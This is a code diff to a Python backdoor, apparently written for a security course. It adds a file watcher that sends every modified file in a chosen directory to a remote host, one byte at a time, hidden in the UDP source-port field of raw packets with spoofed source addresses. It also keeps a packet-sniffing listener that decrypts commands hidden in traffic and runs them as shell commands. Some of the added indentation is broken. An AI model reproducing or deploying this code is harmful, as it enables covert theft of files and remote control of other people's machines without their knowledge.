@@ -1,6 +1,6 @@
 import hashlib, ConfigParser
 #from Crypto import Random
-import subprocess
+import subprocess, threading, pyinotify, string
 from time import sleep
 
 from Crypto.Cipher import AES
@@ -15,10 +15,128 @@ configFilePath = r'config.txt'
 configParser.read(configFilePath)
 
 key = configParser.get('config', 'password')
+directory = configParser.get('config', 'fileDir')
+srcIP = configParser.get('config', 'srcIP')
+dstIP = configParser.get('config', 'dstIP')
+
+wm = pyinotify.WatchManager()
+mask = pyinotify.IN_CLOSE_WRITE | pyinotify.IN_CREATE
+
 
 #Using encryption code from backdoor assignment
 
 IV = 16 * '\x00'#16 is block size
+
+
+
+
+
+
+
+# CLASS EventHandler
+#  We specify a directory, whenever a file is modified in that directory
+# we send it to the server using a covert channel
+
+class EventHandler(pyinotify.ProcessEvent):
+    # when a specified file is modified
+    def process_IN_CLOSE_WRITE(self, event):
+        filepath = event.pathname
+        filename = event.name
+        byteCounter = 0
+        print filename, " was modified\n"
+
+        #ensure it is not temp file as it could cause error
+        if ("/." not in filepath) or ("~" not in filepath):
+            #open modified file
+            secretFile = open(filepath, 'rb')
+            data_byte_array = bytearray(secretFile.read())
+
+            # create a raw socket
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            except socket.error, msg:
+                print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+                sys.exit()
+
+            # ip header fields
+            ip_ihl = 5
+            ip_ver = 4
+            ip_tos = 0
+            ip_id = 123
+            ip_tot_len = 0  # kernel will fill the correct total length
+            ip_frag_off = 0
+            ip_ttl = 144
+            protocol = "UDP"
+            if (protocol == "UDP"):
+                ip_proto = socket.IPPROTO_UDP
+            ip_check = 0  # kernel will fill the correct checksum
+            ip_saddr = socket.inet_aton(srcIP)  # Spoof the source ip address if you want to
+            ip_daddr = socket.inet_aton(dstIP)
+
+            ip_ihl_ver = (ip_ver << 4) + ip_ihl
+
+            # the ! in the pack format string means network order
+            ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto,
+                             ip_check, ip_saddr, ip_daddr)
+
+            if (protocol == "UDP"):
+                data = ""
+                dport = 8505
+                length = 8 + len(str(data))
+                checksum = 0
+
+
+                for b in data_byte_array:
+                    sport = b
+                    udp_header = pack('!HHHH', sport, dport, length, checksum)
+                    packet = ip_header + udp_header + str(data)
+                    print "Sending packet with byte: "+str(b)
+                    s.sendto(packet, (dstIP, 0))
+
+
+
+                #After sending the byte array, send conclusive packet with ttl 188
+                ip_id=1234
+                # the ! in the pack format string means network order
+                ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto,
+                                 ip_check, ip_saddr, ip_daddr)
+
+                if (protocol == "UDP"):
+                    #filename sent as data
+                    data = filename
+                    dport = 8505
+                    length = 8 + len(str(data))
+                    checksum = 0
+                    udp_header = pack('!HHHH', sport, dport, length, checksum)
+                    packet = ip_header + udp_header + str(data)
+                    s.sendto(packet, (dstIP, 0))
+
+
+
+
+
+
+
+def watch_file(directory):
+
+    handler = EventHandler()
+    notifier = pyinotify.Notifier(wm, handler)
+    wdd = wm.add_watch(directory, mask, rec=True)
+    notifier.loop()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #convert the password to a 32-byte key using the SHA-256 algorithm
 def getKey():
@@ -169,7 +287,7 @@ def sendCommand(protocol, srcIP, dstIP,  data, password, last):
         packet = ip_header + tcp_header + str(data)
 
     if (protocol == "UDP"):
-        print "create UDP header"
+        #print "create UDP header"
         data = data
         sport = password
         dport = 8505
@@ -183,6 +301,8 @@ def sendCommand(protocol, srcIP, dstIP,  data, password, last):
 
 
 def main(argv):
+    t = threading.Thread(name="watchfile_threading", target=watch_file, args=[directory])
+    t.start()
     # list all devices
     devices = pcapy.findalldevs()
     #print devices
@@ -205,7 +325,7 @@ def main(argv):
     #   promiscious mode (1 for true)
     #   timeout (in milliseconds)
     '''
-    cap = pcapy.open_live("ens33", 65536, 1, 0)
+    cap = pcapy.open_live("eno1", 65536, 1, 0)
 
     # start sniffing packets
     while (1):
@@ -255,11 +375,11 @@ def parse_packet(packet):
             protocol = iph[6]
             s_addr = socket.inet_ntoa(iph[8]);
             d_addr = socket.inet_ntoa(iph[9]);
-
+        '''
             print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(
                 ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(
                 s_addr) + ' Destination Address : ' + str(d_addr)
-
+        '''
             # TCP protocol
             if protocol == 6:
                 t = iph_length + eth_length
@@ -283,11 +403,11 @@ def parse_packet(packet):
 
                     h_size = eth_length + iph_length + tcph_length * 4
                     data_size = len(packet) - h_size
-
+            print tcph[6], len(packet), h_size, data_size, eth_length, iph_length, tcph_length
                     # get data from the packet
-                    data = packet[h_size:]
+                    data = packet[h_size:h_size+tcph[6]]
                     commandString = decrypt(data)
-
+            print len(commandString)
                     print 'Data : ' + commandString
                     output_dec = shellCommand(packet, commandString)
                     sleep(2)
@@ -326,7 +446,7 @@ def parse_packet(packet):
                     data_size = len(packet) - h_size
 
                     # get data from the packet
-                    data = packet[h_size:]
+                    data = packet[h_size:h_size+checksum]
 
                     commandString = decrypt(data)
 
@@ -346,42 +466,6 @@ def parse_packet(packet):
                         else:
                             sendCommand("UDP", d_addr, s_addr, 1000, seq, False)
                             counter += 1
-
-
-        #Dont need ICMP and UDP for now
-        '''
-        # ICMP Packets
-        elif protocol == 1:
-            u = iph_length + eth_length
-            icmph_length = 4
-            icmp_header = packet[u:u + 4]
-
-            # now unpack them :)
-            icmph = unpack('!BBH', icmp_header)
-
-            icmp_type = icmph[0]
-            code = icmph[1]
-            checksum = icmph[2]
-
-            print 'Type : ' + str(icmp_type) + ' Code : ' + str(code) + ' Checksum : ' + str(checksum)
-
-            h_size = eth_length + iph_length + icmph_length
-            data_size = len(packet) - h_size
-
-            # get data from the packet
-            data = packet[h_size:]
-
-            print 'Data : ' + data
-
-
-
-        # some other IP packet like IGMP
-        else:
-            print 'Protocol other than TCP/UDP/ICMP'
-
-        print
-        '''
-
 
 if __name__ == "__main__":
     try:
